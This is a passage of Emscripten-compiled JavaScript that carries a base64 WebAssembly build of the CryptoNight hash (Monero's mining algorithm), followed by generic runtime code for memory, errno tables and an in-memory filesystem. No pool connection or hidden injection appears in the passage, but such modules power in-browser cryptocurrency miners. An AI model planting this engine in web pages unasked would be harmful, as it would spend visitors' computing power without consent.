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";
            return Uint8Array.from(atob(raw), c => c.charCodeAt(0))
        }
        return new Promise((function(resolve, reject) {
            resolve(getBinary())
        }))
    }

    function doNativeWasm(global, env, providedBuffer) {
        if (typeof WebAssembly !== "object") {
            Module.printErr("no native wasm support detected");
            return !1
        }
        if (!(Module.wasmMemory instanceof WebAssembly.Memory)) {
            Module.printErr("no native wasm Memory in use");
            return !1
        }
        env.memory = Module.wasmMemory;
        info.global = {
            "NaN": NaN,
            "Infinity": Infinity
        };
        info["global.Math"] = global.Math;
        info.env = env;

        function receiveInstance(instance) {
            exports = instance.exports;
            if (exports.memory) mergeMemory(exports.memory);
            Module.asm = exports;
            Module.usingWasm = !0;
            removeRunDependency("wasm-instantiate")
        }
        addRunDependency("wasm-instantiate");
        if (Module.instantiateWasm) {
            try {
                return Module.instantiateWasm(info, receiveInstance)
            } catch (e) {
                Module.printErr("Module.instantiateWasm callback failed with error: " + e);
                return !1
            }
        }
        WebAssembly.instantiate(getBinaryPromise(), info).then((function(output) {
            receiveInstance(output.instance)
        }));
        return {}
    }
    Module.asmPreload = Module.asm;
    var asmjsReallocBuffer = Module.reallocBuffer;
    var wasmReallocBuffer = (function(size) {
        var PAGE_MULTIPLE = Module.usingWasm ? WASM_PAGE_SIZE : ASMJS_PAGE_SIZE;
        size = alignUp(size, PAGE_MULTIPLE);
        var old = Module.buffer;
        var oldSize = old.byteLength;
        if (Module.usingWasm) {
            try {
                var result = Module.wasmMemory.grow((size - oldSize) / wasmPageSize);
                if (result !== (-1 | 0)) {
                    return Module.buffer = Module.wasmMemory.buffer
                } else {
                    return null
                }
            } catch (e) {
                return null
            }
        } else {
            exports.__growWasmMemory((size - oldSize) / wasmPageSize);
            return Module.buffer !== old ? Module.buffer : null
        }
    });
    Module.reallocBuffer = (function(size) {
        if (finalMethod === "asmjs") {
            return asmjsReallocBuffer(size)
        } else {
            return wasmReallocBuffer(size)
        }
    });
    var finalMethod = "";
    Module.asm = (function(global, env, providedBuffer) {
        global = fixImports(global);
        env = fixImports(env);
        if (!env.table) {
            var TABLE_SIZE = Module.wasmTableSize;
            if (TABLE_SIZE === undefined) TABLE_SIZE = 1024;
            var MAX_TABLE_SIZE = Module.wasmMaxTableSize;
            if (typeof WebAssembly === "object" && typeof WebAssembly.Table === "function") {
                if (MAX_TABLE_SIZE !== undefined) {
                    env.table = new WebAssembly.Table({
                        "initial": TABLE_SIZE,
                        "maximum": MAX_TABLE_SIZE,
                        "element": "anyfunc"
                    })
                } else {
                    env.table = new WebAssembly.Table({
                        "initial": TABLE_SIZE,
                        element: "anyfunc"
                    })
                }
            } else {
                env.table = new Array(TABLE_SIZE)
            }
            Module.wasmTable = env.table
        }
        if (!env.memoryBase) {
            env.memoryBase = Module.STATIC_BASE
        }
        if (!env.tableBase) {
            env.tableBase = 0
        }
        var exports;
        exports = doNativeWasm(global, env, providedBuffer);
        return exports
    });
    var methodHandler = Module.asm
}
integrateWasmJS(Module);
var ASM_CONSTS = [];
STATIC_BASE = Runtime.GLOBAL_BASE;
STATICTOP = STATIC_BASE + 12512;
__ATINIT__.push();
memoryInitializer = Module.wasmJSMethod.indexOf("asmjs") >= 0 || Module.wasmJSMethod.indexOf("interpret-asm2wasm") >= 0 ? "cryptonight.js.mem" : null;
var STATIC_BUMP = 12512;
Module.STATIC_BASE = STATIC_BASE;
Module.STATIC_BUMP = STATIC_BUMP;
var tempDoublePtr = STATICTOP;
STATICTOP += 16;

function ___assert_fail(condition, filename, line, func) {
    ABORT = !0;
    throw "Assertion failed: " + Pointer_stringify(condition) + ", at: " + [filename ? Pointer_stringify(filename) : "unknown filename", line, func ? Pointer_stringify(func) : "unknown function"] + " at " + stackTrace()
}
var PROCINFO = {
    ppid: 1,
    pid: 42,
    sid: 42,
    pgid: 42
};
var ERRNO_CODES = {
    EPERM: 1,
    ENOENT: 2,
    ESRCH: 3,
    EINTR: 4,
    EIO: 5,
    ENXIO: 6,
    E2BIG: 7,
    ENOEXEC: 8,
    EBADF: 9,
    ECHILD: 10,
    EAGAIN: 11,
    EWOULDBLOCK: 11,
    ENOMEM: 12,
    EACCES: 13,
    EFAULT: 14,
    ENOTBLK: 15,
    EBUSY: 16,
    EEXIST: 17,
    EXDEV: 18,
    ENODEV: 19,
    ENOTDIR: 20,
    EISDIR: 21,
    EINVAL: 22,
    ENFILE: 23,
    EMFILE: 24,
    ENOTTY: 25,
    ETXTBSY: 26,
    EFBIG: 27,
    ENOSPC: 28,
    ESPIPE: 29,
    EROFS: 30,
    EMLINK: 31,
    EPIPE: 32,
    EDOM: 33,
    ERANGE: 34,
    ENOMSG: 42,
    EIDRM: 43,
    ECHRNG: 44,
    EL2NSYNC: 45,
    EL3HLT: 46,
    EL3RST: 47,
    ELNRNG: 48,
    EUNATCH: 49,
    ENOCSI: 50,
    EL2HLT: 51,
    EDEADLK: 35,
    ENOLCK: 37,
    EBADE: 52,
    EBADR: 53,
    EXFULL: 54,
    ENOANO: 55,
    EBADRQC: 56,
    EBADSLT: 57,
    EDEADLOCK: 35,
    EBFONT: 59,
    ENOSTR: 60,
    ENODATA: 61,
    ETIME: 62,
    ENOSR: 63,
    ENONET: 64,
    ENOPKG: 65,
    EREMOTE: 66,
    ENOLINK: 67,
    EADV: 68,
    ESRMNT: 69,
    ECOMM: 70,
    EPROTO: 71,
    EMULTIHOP: 72,
    EDOTDOT: 73,
    EBADMSG: 74,
    ENOTUNIQ: 76,
    EBADFD: 77,
    EREMCHG: 78,
    ELIBACC: 79,
    ELIBBAD: 80,
    ELIBSCN: 81,
    ELIBMAX: 82,
    ELIBEXEC: 83,
    ENOSYS: 38,
    ENOTEMPTY: 39,
    ENAMETOOLONG: 36,
    ELOOP: 40,
    EOPNOTSUPP: 95,
    EPFNOSUPPORT: 96,
    ECONNRESET: 104,
    ENOBUFS: 105,
    EAFNOSUPPORT: 97,
    EPROTOTYPE: 91,
    ENOTSOCK: 88,
    ENOPROTOOPT: 92,
    ESHUTDOWN: 108,
    ECONNREFUSED: 111,
    EADDRINUSE: 98,
    ECONNABORTED: 103,
    ENETUNREACH: 101,
    ENETDOWN: 100,
    ETIMEDOUT: 110,
    EHOSTDOWN: 112,
    EHOSTUNREACH: 113,
    EINPROGRESS: 115,
    EALREADY: 114,
    EDESTADDRREQ: 89,
    EMSGSIZE: 90,
    EPROTONOSUPPORT: 93,
    ESOCKTNOSUPPORT: 94,
    EADDRNOTAVAIL: 99,
    ENETRESET: 102,
    EISCONN: 106,
    ENOTCONN: 107,
    ETOOMANYREFS: 109,
    EUSERS: 87,
    EDQUOT: 122,
    ESTALE: 116,
    ENOTSUP: 95,
    ENOMEDIUM: 123,
    EILSEQ: 84,
    EOVERFLOW: 75,
    ECANCELED: 125,
    ENOTRECOVERABLE: 131,
    EOWNERDEAD: 130,
    ESTRPIPE: 86
};
var ERRNO_MESSAGES = {
    0: "Success",
    1: "Not super-user",
    2: "No such file or directory",
    3: "No such process",
    4: "Interrupted system call",
    5: "I/O error",
    6: "No such device or address",
    7: "Arg list too long",
    8: "Exec format error",
    9: "Bad file number",
    10: "No children",
    11: "No more processes",
    12: "Not enough core",
    13: "Permission denied",
    14: "Bad address",
    15: "Block device required",
    16: "Mount device busy",
    17: "File exists",
    18: "Cross-device link",
    19: "No such device",
    20: "Not a directory",
    21: "Is a directory",
    22: "Invalid argument",
    23: "Too many open files in system",
    24: "Too many open files",
    25: "Not a typewriter",
    26: "Text file busy",
    27: "File too large",
    28: "No space left on device",
    29: "Illegal seek",
    30: "Read only file system",
    31: "Too many links",
    32: "Broken pipe",
    33: "Math arg out of domain of func",
    34: "Math result not representable",
    35: "File locking deadlock error",
    36: "File or path name too long",
    37: "No record locks available",
    38: "Function not implemented",
    39: "Directory not empty",
    40: "Too many symbolic links",
    42: "No message of desired type",
    43: "Identifier removed",
    44: "Channel number out of range",
    45: "Level 2 not synchronized",
    46: "Level 3 halted",
    47: "Level 3 reset",
    48: "Link number out of range",
    49: "Protocol driver not attached",
    50: "No CSI structure available",
    51: "Level 2 halted",
    52: "Invalid exchange",
    53: "Invalid request descriptor",
    54: "Exchange full",
    55: "No anode",
    56: "Invalid request code",
    57: "Invalid slot",
    59: "Bad font file fmt",
    60: "Device not a stream",
    61: "No data (for no delay io)",
    62: "Timer expired",
    63: "Out of streams resources",
    64: "Machine is not on the network",
    65: "Package not installed",
    66: "The object is remote",
    67: "The link has been severed",
    68: "Advertise error",
    69: "Srmount error",
    70: "Communication error on send",
    71: "Protocol error",
    72: "Multihop attempted",
    73: "Cross mount point (not really error)",
    74: "Trying to read unreadable message",
    75: "Value too large for defined data type",
    76: "Given log. name not unique",
    77: "f.d. invalid for this operation",
    78: "Remote address changed",
    79: "Can access a needed shared lib",
    80: "Accessing a corrupted shared lib",
    81: ".lib section in a.out corrupted",
    82: "Attempting to link in too many libs",
    83: "Attempting to exec a shared library",
    84: "Illegal byte sequence",
    86: "Streams pipe error",
    87: "Too many users",
    88: "Socket operation on non-socket",
    89: "Destination address required",
    90: "Message too long",
    91: "Protocol wrong type for socket",
    92: "Protocol not available",
    93: "Unknown protocol",
    94: "Socket type not supported",
    95: "Not supported",
    96: "Protocol family not supported",
    97: "Address family not supported by protocol family",
    98: "Address already in use",
    99: "Address not available",
    100: "Network interface is not configured",
    101: "Network is unreachable",
    102: "Connection reset by network",
    103: "Connection aborted",
    104: "Connection reset by peer",
    105: "No buffer space available",
    106: "Socket is already connected",
    107: "Socket is not connected",
    108: "Can\'t send after socket shutdown",
    109: "Too many references",
    110: "Connection timed out",
    111: "Connection refused",
    112: "Host is down",
    113: "Host is unreachable",
    114: "Socket already connected",
    115: "Connection already in progress",
    116: "Stale file handle",
    122: "Quota exceeded",
    123: "No medium (in tape drive)",
    125: "Operation canceled",
    130: "Previous owner died",
    131: "State not recoverable"
};

function ___setErrNo(value) {
    if (Module.___errno_location) HEAP32[Module.___errno_location() >> 2] = value;
    return value
}
var PATH = {
    splitPath: (function(filename) {
        var splitPathRe = /^(\/?|)([\s\S]*?)((?:\.{1,2}|[^\/]+?|)(\.[^.\/]*|))(?:[\/]*)$/;
        return splitPathRe.exec(filename).slice(1)
    }),
    normalizeArray: (function(parts, allowAboveRoot) {
        var up = 0;
        for (var i = parts.length - 1; i >= 0; i--) {
            var last = parts[i];
            if (last === ".") {
                parts.splice(i, 1)
            } else if (last === "..") {
                parts.splice(i, 1);
                up++
            } else if (up) {
                parts.splice(i, 1);
                up--
            }
        }
        if (allowAboveRoot) {
            for (; up; up--) {
                parts.unshift("..")
            }
        }
        return parts
    }),
    normalize: (function(path) {
        var isAbsolute = path.charAt(0) === "/",
            trailingSlash = path.substr(-1) === "/";
        path = PATH.normalizeArray(path.split("/").filter((function(p) {
            return !!p
        })), !isAbsolute).join("/");
        if (!path && !isAbsolute) {
            path = "."
        }
        if (path && trailingSlash) {
            path += "/"
        }
        return (isAbsolute ? "/" : "") + path
    }),
    dirname: (function(path) {
        var result = PATH.splitPath(path),
            root = result[0],
            dir = result[1];
        if (!root && !dir) {
            return "."
        }
        if (dir) {
            dir = dir.substr(0, dir.length - 1)
        }
        return root + dir
    }),
    basename: (function(path) {
        if (path === "/") return "/";
        var lastSlash = path.lastIndexOf("/");
        if (lastSlash === -1) return path;
        return path.substr(lastSlash + 1)
    }),
    extname: (function(path) {
        return PATH.splitPath(path)[3]
    }),
    join: (function() {
        var paths = Array.prototype.slice.call(arguments, 0);
        return PATH.normalize(paths.join("/"))
    }),
    join2: (function(l, r) {
        return PATH.normalize(l + "/" + r)
    }),
    resolve: (function() {
        var resolvedPath = "",
            resolvedAbsolute = !1;
        for (var i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
            var path = i >= 0 ? arguments[i] : FS.cwd();
            if (typeof path !== "string") {
                throw new TypeError("Arguments to path.resolve must be strings")
            } else if (!path) {
                return ""
            }
            resolvedPath = path + "/" + resolvedPath;
            resolvedAbsolute = path.charAt(0) === "/"
        }
        resolvedPath = PATH.normalizeArray(resolvedPath.split("/").filter((function(p) {
            return !!p
        })), !resolvedAbsolute).join("/");
        return (resolvedAbsolute ? "/" : "") + resolvedPath || "."
    }),
    relative: (function(from, to) {
        from = PATH.resolve(from).substr(1);
        to = PATH.resolve(to).substr(1);

        function trim(arr) {
            var start = 0;
            for (; start < arr.length; start++) {
                if (arr[start] !== "") break
            }
            var end = arr.length - 1;
            for (; end >= 0; end--) {
                if (arr[end] !== "") break
            }
            if (start > end) return [];
            return arr.slice(start, end - start + 1)
        }
        var fromParts = trim(from.split("/"));
        var toParts = trim(to.split("/"));
        var length = Math.min(fromParts.length, toParts.length);
        var samePartsLength = length;
        for (var i = 0; i < length; i++) {
            if (fromParts[i] !== toParts[i]) {
                samePartsLength = i;
                break
            }
        }
        var outputParts = [];
        for (var i = samePartsLength; i < fromParts.length; i++) {
            outputParts.push("..")
        }
        outputParts = outputParts.concat(toParts.slice(samePartsLength));
        return outputParts.join("/")
    })
};
var TTY = {
    ttys: [],
    init: (function() {}),
    shutdown: (function() {}),
    register: (function(dev, ops) {
        TTY.ttys[dev] = {
            input: [],
            output: [],
            ops: ops
        };
        FS.registerDevice(dev, TTY.stream_ops)
    }),
    stream_ops: {
        open: (function(stream) {
            var tty = TTY.ttys[stream.node.rdev];
            if (!tty) {
                throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
            }
            stream.tty = tty;
            stream.seekable = !1
        }),
        close: (function(stream) {
            stream.tty.ops.flush(stream.tty)
        }),
        flush: (function(stream) {
            stream.tty.ops.flush(stream.tty)
        }),
        read: (function(stream, buffer, offset, length, pos) {
            if (!stream.tty || !stream.tty.ops.get_char) {
                throw new FS.ErrnoError(ERRNO_CODES.ENXIO)
            }
            var bytesRead = 0;
            for (var i = 0; i < length; i++) {
                var result;
                try {
                    result = stream.tty.ops.get_char(stream.tty)
                } catch (e) {
                    throw new FS.ErrnoError(ERRNO_CODES.EIO)
                }
                if (result === undefined && bytesRead === 0) {
                    throw new FS.ErrnoError(ERRNO_CODES.EAGAIN)
                }
                if (result === null || result === undefined) break;
                bytesRead++;
                buffer[offset + i] = result
            }
            if (bytesRead) {
                stream.node.timestamp = Date.now()
            }
            return bytesRead
        }),
        write: (function(stream, buffer, offset, length, pos) {
            if (!stream.tty || !stream.tty.ops.put_char) {
                throw new FS.ErrnoError(ERRNO_CODES.ENXIO)
            }
            for (var i = 0; i < length; i++) {
                try {
                    stream.tty.ops.put_char(stream.tty, buffer[offset + i])
                } catch (e) {
                    throw new FS.ErrnoError(ERRNO_CODES.EIO)
                }
            }
            if (length) {
                stream.node.timestamp = Date.now()
            }
            return i
        })
    },
    default_tty_ops: {
        get_char: (function(tty) {
            if (!tty.input.length) {
                var result = null;
                if (ENVIRONMENT_IS_NODE) {
                    var BUFSIZE = 256;
                    var buf = new Buffer(BUFSIZE);
                    var bytesRead = 0;
                    var isPosixPlatform = process.platform != "win32";
                    var fd = process.stdin.fd;
                    if (isPosixPlatform) {
                        var usingDevice = !1;
                        try {
                            fd = fs.openSync("/dev/stdin", "r");
                            usingDevice = !0
                        } catch (e) {}
                    }
                    try {
                        bytesRead = fs.readSync(fd, buf, 0, BUFSIZE, null)
                    } catch (e) {
                        if (e.toString().indexOf("EOF") != -1) bytesRead = 0;
                        else throw e
                    }
                    if (usingDevice) {
                        fs.closeSync(fd)
                    }
                    if (bytesRead > 0) {
                        result = buf.slice(0, bytesRead).toString("utf-8")
                    } else {
                        result = null
                    }
                } else if (typeof window != "undefined" && typeof window.prompt == "function") {
                    result = window.prompt("Input: ");
                    if (result !== null) {
                        result += "\\n"
                    }
                } else if (typeof readline == "function") {
                    result = readline();
                    if (result !== null) {
                        result += "\\n"
                    }
                }
                if (!result) {
                    return null
                }
                tty.input = intArrayFromString(result, !0)
            }
            return tty.input.shift()
        }),
        put_char: (function(tty, val) {
            if (val === null || val === 10) {
                Module.print(UTF8ArrayToString(tty.output, 0));
                tty.output = []
            } else {
                if (val != 0) tty.output.push(val)
            }
        }),
        flush: (function(tty) {
            if (tty.output && tty.output.length > 0) {
                Module.print(UTF8ArrayToString(tty.output, 0));
                tty.output = []
            }
        })
    },
    default_tty1_ops: {
        put_char: (function(tty, val) {
            if (val === null || val === 10) {
                Module.printErr(UTF8ArrayToString(tty.output, 0));
                tty.output = []
            } else {
                if (val != 0) tty.output.push(val)
            }
        }),
        flush: (function(tty) {
            if (tty.output && tty.output.length > 0) {
                Module.printErr(UTF8ArrayToString(tty.output, 0));
                tty.output = []
            }
        })
    }
};
var MEMFS = {
    ops_table: null,
    mount: (function(mount) {
        return MEMFS.createNode(null, "/", 16384 | 511, 0)
    }),
    createNode: (function(parent, name, mode, dev) {
        if (FS.isBlkdev(mode) || FS.isFIFO(mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (!MEMFS.ops_table) {
            MEMFS.ops_table = {
                dir: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr,
                        lookup: MEMFS.node_ops.lookup,
                        mknod: MEMFS.node_ops.mknod,
                        rename: MEMFS.node_ops.rename,
                        unlink: MEMFS.node_ops.unlink,
                        rmdir: MEMFS.node_ops.rmdir,
                        readdir: MEMFS.node_ops.readdir,
                        symlink: MEMFS.node_ops.symlink
                    },
                    stream: {
                        llseek: MEMFS.stream_ops.llseek
                    }
                },
                file: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr
                    },
                    stream: {
                        llseek: MEMFS.stream_ops.llseek,
                        read: MEMFS.stream_ops.read,
                        write: MEMFS.stream_ops.write,
                        allocate: MEMFS.stream_ops.allocate,
                        mmap: MEMFS.stream_ops.mmap,
                        msync: MEMFS.stream_ops.msync
                    }
                },
                link: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr,
                        readlink: MEMFS.node_ops.readlink
                    },
                    stream: {}
                },
                chrdev: {
                    node: {
                        getattr: MEMFS.node_ops.getattr,
                        setattr: MEMFS.node_ops.setattr
                    },
                    stream: FS.chrdev_stream_ops
                }
            }
        }
        var node = FS.createNode(parent, name, mode, dev);
        if (FS.isDir(node.mode)) {
            node.node_ops = MEMFS.ops_table.dir.node;
            node.stream_ops = MEMFS.ops_table.dir.stream;
            node.contents = {}
        } else if (FS.isFile(node.mode)) {
            node.node_ops = MEMFS.ops_table.file.node;
            node.stream_ops = MEMFS.ops_table.file.stream;
            node.usedBytes = 0;
            node.contents = null
        } else if (FS.isLink(node.mode)) {
            node.node_ops = MEMFS.ops_table.link.node;
            node.stream_ops = MEMFS.ops_table.link.stream
        } else if (FS.isChrdev(node.mode)) {
            node.node_ops = MEMFS.ops_table.chrdev.node;
            node.stream_ops = MEMFS.ops_table.chrdev.stream
        }
        node.timestamp = Date.now();
        if (parent) {
            parent.contents[name] = node
        }
        return node
    }),
    getFileDataAsRegularArray: (function(node) {
        if (node.contents && node.contents.subarray) {
            var arr = [];
            for (var i = 0; i < node.usedBytes; ++i) arr.push(node.contents[i]);
            return arr
        }
        return node.contents
    }),
    getFileDataAsTypedArray: (function(node) {
        if (!node.contents) return new Uint8Array;
        if (node.contents.subarray) return node.contents.subarray(0, node.usedBytes);
        return new Uint8Array(node.contents)
    }),
    expandFileStorage: (function(node, newCapacity) {
        if (node.contents && node.contents.subarray && newCapacity > node.contents.length) {
            node.contents = MEMFS.getFileDataAsRegularArray(node);
            node.usedBytes = node.contents.length
        }
        if (!node.contents || node.contents.subarray) {
            var prevCapacity = node.contents ? node.contents.length : 0;
            if (prevCapacity >= newCapacity) return;
            var CAPACITY_DOUBLING_MAX = 1024 * 1024;
            newCapacity = Math.max(newCapacity, prevCapacity * (prevCapacity < CAPACITY_DOUBLING_MAX ? 2 : 1.125) | 0);
            if (prevCapacity != 0) newCapacity = Math.max(newCapacity, 256);
            var oldContents = node.contents;
            node.contents = new Uint8Array(newCapacity);
            if (node.usedBytes > 0) node.contents.set(oldContents.subarray(0, node.usedBytes), 0);
            return
        }
        if (!node.contents && newCapacity > 0) node.contents = [];
        while (node.contents.length < newCapacity) node.contents.push(0)
    }),
    resizeFileStorage: (function(node, newSize) {
        if (node.usedBytes == newSize) return;
        if (newSize == 0) {
            node.contents = null;
            node.usedBytes = 0;
            return
        }
        if (!node.contents || node.contents.subarray) {
            var oldContents = node.contents;
            node.contents = new Uint8Array(new ArrayBuffer(newSize));
            if (oldContents) {
                node.contents.set(oldContents.subarray(0, Math.min(newSize, node.usedBytes)))
            }
            node.usedBytes = newSize;
            return
        }
        if (!node.contents) node.contents = [];
